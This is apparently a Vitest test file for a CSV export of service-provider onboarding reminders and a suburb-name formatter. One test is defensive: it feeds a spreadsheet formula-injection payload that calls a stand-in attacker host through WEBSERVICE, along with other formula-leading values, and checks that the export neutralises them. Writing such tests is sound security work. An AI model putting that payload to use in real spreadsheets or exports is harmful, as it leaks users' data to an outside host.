import { describe, expect, it } from 'vitest'

import { buildNudgeCsv, humanizeSuburbSlug } from '@/lib/nudges/csv'
import type { NudgeCandidate } from '@/lib/nudges/queue'

const baseCandidate: NudgeCandidate = {
  providerId: 'p1',
  name: 'Sipho Mahlangu',
  phone: '+27821234567',
  email: 'sipho@example.com',
  tier: 'R5',
  skills: ['plumbing'],
  serviceAreas: ['gauteng__johannesburg__jhb_west__honeydew'],
  missingItems: ['bank details', 'equipment list'],
  missingItemsLabel: 'bank details and equipment list',
  renderedMessage: 'Hi Sipho, …',
  lastNudgedAt: null,
  applicationStatus: null,
}

describe('buildNudgeCsv', () => {
  it('emits the spec header row in order', () => {
    const csv = buildNudgeCsv([])
    const firstLine = csv.split('\n')[0]
    expect(firstLine).toBe(
      'provider_id,name,phone,tier,primary_skills,missing_items,suburb_label,application_status,rendered_message',
    )
  })

  it('renders a row per candidate', () => {
    const csv = buildNudgeCsv([baseCandidate])
    const lines = csv.trim().split('\n')
    expect(lines).toHaveLength(2)
    expect(lines[1]).toContain('p1')
    expect(lines[1]).toContain('Sipho Mahlangu')
    expect(lines[1]).toContain('+27821234567')
    expect(lines[1]).toContain('R5')
    expect(lines[1]).toContain('plumbing')
  })

  it('escapes commas, quotes, and newlines inside cell values', () => {
    const csv = buildNudgeCsv([
      {
        ...baseCandidate,
        name: 'Smith, John "JJ"',
        renderedMessage: 'Hi Smith,\nThis is a multi-line\nmessage with "quotes".',
      },
    ])
    const dataLine = csv.split('\n').slice(1).join('\n')
    // Comma inside name forces quoting; embedded quote is doubled.
    expect(dataLine).toContain('"Smith, John ""JJ"""')
    // Multi-line message forces quoting (newlines inside a quoted CSV cell are legal).
    expect(dataLine).toMatch(/"Hi Smith,\nThis is a multi-line\nmessage with ""quotes""\."/)
  })

  it('neutralizes spreadsheet formula-injection payloads in provider-controlled cells', () => {
    const csv = buildNudgeCsv([
      {
        ...baseCandidate,
        name: '=WEBSERVICE("https://attacker.example/"&A1)',
        renderedMessage: '@SUM(1+1)',
      },
    ])
    const dataLine = csv.trim().split('\n')[1]
    // Formula-leading cells are quoted AND prefixed with a single quote so the
    // spreadsheet treats them as text instead of executing them.
    expect(dataLine).toContain('"\'=WEBSERVICE(""https://attacker.example/""&A1)"')
    expect(dataLine).toContain('"\'@SUM(1+1)"')
    // The raw, unprefixed formula must not appear.
    expect(dataLine).not.toMatch(/,=WEBSERVICE/)
  })

  it('neutralizes +, -, and @ formula leads too', () => {
    for (const payload of ['+1+1', '-1+1', '@cmd']) {
      const line = buildNudgeCsv([{ ...baseCandidate, name: payload }]).trim().split('\n')[1]
      expect(line).toContain(`"'${payload}"`)
    }
  })

  it('joins skills with a pipe in the primary_skills column', () => {
    const csv = buildNudgeCsv([{ ...baseCandidate, skills: ['plumbing', 'painting'] }])
    expect(csv).toContain('plumbing|painting')
  })

  it('renders suburb_label as a friendly label, not the raw slug', () => {
    const csv = buildNudgeCsv([baseCandidate])
    const dataLine = csv.trim().split('\n')[1]
    expect(dataLine).toContain('Honeydew')
    expect(dataLine).not.toContain('gauteng__johannesburg__jhb_west__honeydew')
  })
})

describe('humanizeSuburbSlug', () => {
  it('takes the last segment of a hierarchical slug and title-cases it', () => {
    expect(humanizeSuburbSlug('gauteng__johannesburg__jhb_west__honeydew')).toBe('Honeydew')
    expect(humanizeSuburbSlug('gauteng__johannesburg__jhb_west__randpark_ridge')).toBe('Randpark Ridge')
    expect(humanizeSuburbSlug('gauteng__johannesburg__jhb_west__little_falls')).toBe('Little Falls')
  })

  it('handles flat slugs without hierarchy separators', () => {
    expect(humanizeSuburbSlug('honeydew')).toBe('Honeydew')
    expect(humanizeSuburbSlug('constantia_kloof')).toBe('Constantia Kloof')
  })

  it('returns empty string for nullish input', () => {
    expect(humanizeSuburbSlug(null)).toBe('')
    expect(humanizeSuburbSlug(undefined)).toBe('')
    expect(humanizeSuburbSlug('')).toBe('')
  })
})
